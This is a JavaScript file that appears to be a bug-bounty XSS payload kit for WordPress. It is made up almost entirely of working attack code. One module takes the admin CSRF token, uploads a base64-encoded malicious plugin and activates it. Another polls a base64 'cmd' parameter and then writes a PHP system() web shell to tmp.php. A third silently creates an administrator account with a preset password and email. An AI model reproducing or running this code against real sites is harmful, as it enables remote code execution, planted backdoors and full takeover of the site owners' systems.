// ************************************ ~% Module RCE %~ ************************************ //

// 1. Obtain CSRF token
fetch("/wp-admin/plugin-install.php")
    .then(resp => resp.text())
    .then(htmlResponse => {
        const htmlDoc = new DOMParser().parseFromString(htmlResponse, "text/html");
        const csrfToken = htmlDoc.getElementsByClassName("wp-upload-form")[0].getElementsByTagName("input")[0].value;

        // 2. Transform plugin (base64) into blob
        const b64_plugin_data = "UEsDBBQAAAAIAOVujVxwkE6cowEAAHUDAAAJAAAAaW5kZXgucGhwnVLLbtswEDxXX7EQerDdSHTdooe0QNs8kAQIEud5CQKBomhKiEUSfEQ2gvx7SEoKfQyy0IHg7Mxwd/Tnr6xlgmYzSGDmPvgnMXnCjAIAsdqINtNUPTeE6oBia2qhwNUG89q19tdr18C1J50sz7NFPv82XPMnCFUbI/U+QqwxtS1zIlo0CqBOqEoqqnWmCM3k2rKGBzoRcqsaVhtYzBc/9nYtAx6JkbQMJ7jALd2Hvg7DHHAzzhG77q7PXNPnX3hENVGNNI3go85labBTdvQW80qDO9NnqrbwrgHSr3fltlhaVgrLzRakVVJomnvRe6p0EIz1PZ/nc4/9D+t/h3ZziPBHx/KMW7oxcCRa9+aR4kfEOsNj8L7tvM83Gsegd+DeOPo6267rcsZtLhRDw0+iEZNrT83Nxjj2YA9LbOqRjdaYM4tZn9ZJY05tuRvap9IaZA4U5mRwcsYeQkmCq6rAxCc5STtZrIQwVKV7kPanwkml099JsrI8dEG8n0zhJfmit9rQdlJiTX/9LCpKREUnX4vr46u745vbh5S0Vfo4dRKvyRtQSwECPwMUAAAACADlbo1ccJBOnKMBAAB1AwAACQAkAAAAAAAAACCApIEAAAAAaW5kZXgucGhwCgAgAAAAAAABABgA7dtiYDzL3AEAAAAAAAAAAAAAAAAAAAAAUEsFBgAAAAABAAEAWwAAAMoBAAAAAA==";
        fetch("data:application/zip;base64," + b64_plugin_data)
            .then(res => res.blob())
            .then(pluginBlob => {
                const formData = new FormData();
                formData.append("_wpnonce", csrfToken);
                formData.append("_wp_http_referer", "/wp-admin/plugin-install.php");
                formData.append("pluginzip", pluginBlob, "plugin.zip");
                formData.append("install-plugin-submit", "Install Now");

                // 3. Upload the malicious plugin
                fetch("/wp-admin/update.php?action=upload-plugin", {
                    "method": "POST",
                    "body": formData
                })
                    .then(resp => resp.text())
                    .then(htmlResponse => {
                        const htmlDoc2 = new DOMParser().parseFromString(htmlResponse, "text/html");
                        const link = htmlDoc2.getElementsByClassName("button button-primary")[0].getAttribute("href");

                        // 4. Activate the plugin
                        fetch("/wp-admin/" + link);
                    });
            });
    });


// ************************************ ~% Test upload shell %~ ************************************ //

const checkServer = setInterval(() => {
    fetch("/?cmd=aWQ=")
        .then(response => {
            if (!response.ok) throw new Error("Erreur réseau");
            return response.text();
        })
        .then(data => {            
            if (data.includes("www-data")) {
                fetch("/?cmd=ZWNobyAnPD9waHAgc3lzdGVtKGJhc2U2NF9kZWNvZGUoJF9HRVRbImNtZCJdKSk7ID8%2BJyA%2BIHRtcC5waHA%3D")
                clearInterval(checkServer);
            }
        })
        .catch(err => {
            console.error("error", err.message);
        });
}, 1000);


// ************************************ ~% Modules Création compte %~ ************************************ //

var Target = document.location.origin; // Ex: https://172.16.0.13:8000/wordpress/
var Callback = null; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).


var Password = "j5p9x6hjkccmrurDjcbpzldvmmsdg54!";          // (weak password are allowed).
var Username = "testbugbounty";         // Ex: operator (It is recommended to use a valid employee name from the target company).
var Role = "administrator";                 // Ex: administrator, editor, author, contributor, subscriber.
var FirstName = ""; // (optional)
var LastName = "";  // (optional)
var Email = "0xNemo-ywh-5d436f491b1fa60a@yeswehack.ninja";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered).


if (Target.substr(-1) != '/') Target += '/';
var _stage1 = new XMLHttpRequest();
_stage1.open("GET", Target + "wp-admin/user-new.php", false);
_stage1.send();

if (_stage1.responseText) {

    var csrf_token = _stage1.responseText.match(/id="_wpnonce_create-user"[\s\S]*?value="(.*?)"/)[1];

    if (csrf_token) {
        var _stage2 = new XMLHttpRequest();
        _stage2.open("POST", Target + "wp-admin/user-new.php", false);
        _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        _stage2.send("action=createuser&_wpnonce_create-user=" +
            csrf_token + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" +
            encodeURIComponent(Username) + "&email=" +
            encodeURIComponent(Email) + "&first_name=" +
            encodeURIComponent(FirstName) + "&last_name=" +
            encodeURIComponent(LastName) + "&url=&pass1=" +
            encodeURIComponent(Password) + "&pass2=" +
            encodeURIComponent(Password) + "&pw_weak=on&role=" +
            Role + "&createuser=Add%2BNew%2BUser");

    }
}

